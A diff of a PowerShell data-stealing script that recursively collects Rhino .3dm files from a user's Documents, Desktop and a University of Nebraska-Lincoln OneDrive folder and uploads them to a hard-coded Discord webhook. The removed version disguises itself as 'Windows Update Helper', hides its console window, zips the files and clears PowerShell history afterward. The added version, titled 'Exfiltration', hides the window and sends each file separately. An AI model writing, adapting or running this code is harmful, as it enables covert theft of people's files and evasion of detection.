@@ -1,104 +1,89 @@
-[Console]::BackgroundColor = "Black" 
-[Console]::Title = "Windows Update Helper"
-[Console]::SetWindowSize(1,1)
+[Console]::BackgroundColor = "Black"
+[Console]::SetWindowSize(57, 5)
+[Console]::Title = "Exfiltration"
 Clear-Host
 
-# Webhook configuration
+# Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
 
-# File extensions to search for
+# Now only searching for .3dm files (Rhino 3D model)
 $fileExtensions = @("*.3dm")
 
-# Folders to search
+# Folders to search for .3dm files (removed Downloads, added OneDrive path)
 $foldersToSearch = @(
-    "$env:USERPROFILE\Documents", 
+    "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-# Create temporary working directory
-$tempDir = "$env:TEMP\WinUpdateTemp"
-$zipPath = "$env:TEMP\3dmFiles.zip"
-if (-not (Test-Path -Path $tempDir)) {
-    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+# Function to send file to Discord
+function Send-FileToDiscord {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$filePath,
+        [Parameter(Mandatory=$false)]
+        [string]$content = ""
+    )
+
+    $fileName = Split-Path -Leaf $filePath
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`n"
+    $body = (
+        "--$boundary$LF" +
+        "Content-Disposition: form-data; name=`"content`"$LF$LF" +
+        "$content$LF" +
+        "--$boundary$LF" +
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
+        "Content-Type: application/octet-stream$LF$LF" +
+        ([System.IO.File]::ReadAllBytes($filePath) | ConvertTo-Base64) + "$LF" +
+        "--$boundary--$LF"
+    )
+
+    try {
+        Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $body
+        Write-Host "Successfully sent $($fileName) to Discord!" -ForegroundColor Green
+    } catch {
+        Write-Host "Error sending $($fileName) to Discord: $_" -ForegroundColor Red
+    }
 }
 
-# Hide the window immediately
+# Hiding the window
+Write-Host "Hiding the Window.."  -ForegroundColor Red
+sleep 1
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
 if($hwnd -ne [System.IntPtr]::Zero){
     $Type::ShowWindowAsync($hwnd, 0)
 }
+else{
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
 
-# Function to send zip to Discord
-function Send-ZipToDiscord {
-    param (
-        [string]$zipPath
-    )
-    
-    try {
-        $fileName = [System.IO.Path]::GetFileName($zipPath)
-        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
-        
-        # Create multipart form content
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        
-        $body = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
-            "Content-Type: application/zip$LF",
-            [System.Text.Encoding]::UTF8.GetString($fileBytes),
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"content`"$LF",
-            "Collected .3dm files from $env:COMPUTERNAME",
-            "--$boundary--$LF"
-        ) -join $LF
+# Loop through all specified folders to search for .3dm files
+foreach ($folder in $foldersToSearch) {
+    Write-Host "Searching in $folder"  -ForegroundColor Yellow
 
-        # Send to Discord
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
-    }
-    catch {
-        # Silent error handling
+    foreach ($extension in $fileExtensions) {
+        $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File
+
+        # Ensure that files are found before proceeding
+        if ($files.Count -eq 0) {
+            Write-Host "No .3dm files found in $folder" -ForegroundColor Red
+        }
+
+        foreach ($file in $files) {
+            Write-Host "Found $($file.FullName)"  -ForegroundColor Gray
+            # Send the file to the Discord webhook
+            Send-FileToDiscord -filePath $file.FullName
+        }
     }
 }
 
-# Main collection process
-try {
-    $foundFiles = @()
-    
-    foreach ($folder in $foldersToSearch) {
-        foreach ($extension in $fileExtensions) {
-            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
-            $foundFiles += $files
-        }
-    }
-
-    if ($foundFiles.Count -gt 0) {
-        # Copy files to temp directory
-        foreach ($file in $foundFiles) {
-            $tempFilePath = Join-Path -Path $tempDir -ChildPath $file.Name
-            Copy-Item -Path $file.FullName -Destination $tempFilePath -Force -ErrorAction SilentlyContinue
-        }
-        
-        # Create zip archive
-        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
-        
-        # Send zip to Discord
-        Send-ZipToDiscord -zipPath $zipPath
-    }
-}
-finally {
-    # Clean up
-    if (Test-Path $tempDir) {
-        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    if (Test-Path $zipPath) {
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-    }
-    
-    # Clear PowerShell history
-    Clear-History
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+# Notify that the exfiltration is complete (if window is not hidden)
+If ($hidden -ne 'y'){
+    Write-Host "File Exfiltration Attempted" -ForegroundColor Green
 }
